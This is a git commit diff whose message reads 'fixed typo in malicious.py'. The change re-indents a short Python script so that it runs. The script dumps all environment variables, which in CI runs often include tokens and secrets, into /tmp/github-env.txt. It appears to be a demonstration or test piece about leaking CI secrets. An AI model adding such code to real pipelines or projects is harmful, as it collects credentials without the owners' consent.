a568f1b938e0482cdb22689e730e8c97ffc5adbb
Antonia Kray <kray.antonia@gmail.com>
2025-07-11 11:54:37 +0200

    fixed typo in malicious.py

--- malicious.py
+++ malicious.py
@@ -1,4 +1,4 @@
 import os 
 with open('/tmp/github-env.txt', 'w') as f: 
-for k, v in os.environ.items(): 
-    f.write(f"{k}={v}\n")
+    for k, v in os.environ.items(): 
+        f.write(f"{k}={v}\n")
